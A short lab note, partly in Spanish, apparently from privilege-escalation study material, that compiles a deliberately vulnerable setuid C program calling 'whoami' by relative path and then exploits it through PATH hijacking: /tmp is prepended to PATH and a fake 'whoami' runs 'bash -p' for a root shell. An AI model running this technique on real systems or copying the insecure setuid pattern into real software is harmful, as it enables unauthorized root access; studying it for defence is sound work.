### path hijacking
```bash
apt install gcc
```
- binary file
```c
#include <stdio.h>

int main() {
    setuid(0);
    printf("\n [+] Actualmente somos el siguiente usuario:\n");
    system("/usr/bin/whoami");
    printf("\n [+] Actualmente somos el sigueinte usuario:\n");
    system("whoami");
    return 0;
}


```

```bash
chmod u+s test

strings test | grep "whoami"
# ans
/usr/bin/whoami
whoami # relative execution

su s4vitar
echo $PATH
export PATH=/tmp/:$PATH
echo $PATH

touch whoami
chmod +x whoami

# whoami
bash -p

/usr/bin/whoami
# root


```